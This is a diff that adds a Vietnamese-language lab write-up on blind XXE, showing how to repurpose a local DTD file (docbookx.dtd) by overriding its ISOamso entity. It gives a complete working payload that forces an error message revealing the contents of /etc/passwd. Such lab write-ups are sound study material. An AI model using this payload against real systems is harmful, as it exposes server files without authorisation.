@@ -206,3 +206,22 @@ Một cách khác để khai thác vuln blind XXE chính là sử dụng lỗi t
 
 ![image-13](images/image-13.png)
 
+### Lab: Exploiting XXE to retrieve data by repurposing a local DTD
+Lab này yêu cầu ta khai thác lỗ hỏng XXE, nhưng khi này hệ thống không có khả năng truy cập vào file DTD ngoài hệ thống. Khi này, nếu ta biết trước vị trí của 1 file DTD có ở trong hệ thống, ta có thể sử dụng file này để thực thi lệnh.
+
+Cụ thể, nếu ta biết trước cấu trúc file đó có những gì, sau đó khai báo biến trùng với biến có trong file đó thì chức năng sẽ bị ghi đè, khi này toàn bộ chức nằng ta muốn có thể khai báo vào biến đó. Ở đây, ta sẽ cần khai báo sao cho hệ thống xảy ra lỗi, từ đó thực thi lệnh đọc và gửi thông báo chứa nội dung file `/etc/passwd`.
+
+Payload cụ thể để trigger lỗi này như sau:
+```xml
+<!DOCTYPE foo [
+<!ENTITY % localdtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///atvd/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%localdtd; 
+]>
+```
+
